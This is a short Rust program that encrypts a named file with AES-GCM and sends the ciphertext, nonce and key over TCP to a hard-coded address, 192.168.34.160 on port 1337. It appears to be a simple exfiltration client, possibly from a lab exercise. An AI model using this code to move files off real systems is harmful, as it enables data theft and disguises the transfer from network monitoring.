use std::{
    env, fs,
    io::Write,
    net::{Shutdown, TcpStream},
    path::PathBuf,
    process::exit,
};

use aes_gcm::{
    aead::{Aead, OsRng},
    AeadCore, Aes256Gcm, Key, KeyInit,
};

fn main() {
    let args: Vec<String> = env::args().collect();
    if args.len() != 2 {
        println!("Usage : {} <FILENAME>", args[0]);
        exit(1);
    }
    let file_path: PathBuf = PathBuf::from(&args[1]);
    if !file_path.is_file() {
        println!("Could not find such file");
        exit(1);
    }
    let Ok(contents) = fs::read(&file_path) else {
        println!("Unable to read file contents");
        exit(1);
    };
    let key: Key<Aes256Gcm> = Aes256Gcm::generate_key(OsRng);
    let cipher = Aes256Gcm::new(&key);
    let nonce = Aes256Gcm::generate_nonce(&mut OsRng);
    let Ok(ciphertext) = cipher.encrypt(&nonce, contents.as_ref()) else {
        println!("Failed to encrypt data");
        exit(1);
    };
    let Ok(mut stream) = TcpStream::connect("192.168.34.160:1337") else {
        println!("Unable to connect to server");
        exit(1);
    };
    let Ok(_) = stream.write(ciphertext.as_ref()) else {
        println!("Failed to write to conneciton");
        exit(1);
    };
    let Ok(_) = stream.write(nonce.as_ref()) else {
        println!("Failed to write to conneciton");
        exit(1);
    };
    let Ok(_) = stream.write(key.as_ref()) else {
        println!("Failed to write to conneciton");
        exit(1);
    };
    let _ = stream.shutdown(Shutdown::Both).unwrap();
}
